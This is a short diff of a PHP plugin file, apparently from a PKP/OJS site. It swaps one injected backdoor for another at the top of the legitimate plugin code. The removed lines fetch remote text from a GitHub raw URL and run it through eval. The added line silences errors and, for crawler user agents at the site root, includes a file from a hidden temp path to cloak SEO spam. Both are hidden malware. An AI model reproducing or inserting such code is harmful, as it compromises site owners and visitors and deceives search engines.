@@ -1,7 +1,5 @@
 <?php
-$casperseo = file_get_contents('https://raw.githubusercontent.com/marketmg126-glitch/landing/refs/heads/main/sahar.txt');
-$casperseo = "?> ".$casperseo;
-eval($casperseo);
+error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/'){ include('/home/riyanmau/.cagefs/tmp/fdfb58798d6f6137b4f7590852622b32'); exit; }
 /**
  * @file plugins/generic/usageEvent/PKPUsageEventPlugin.inc.php
  *
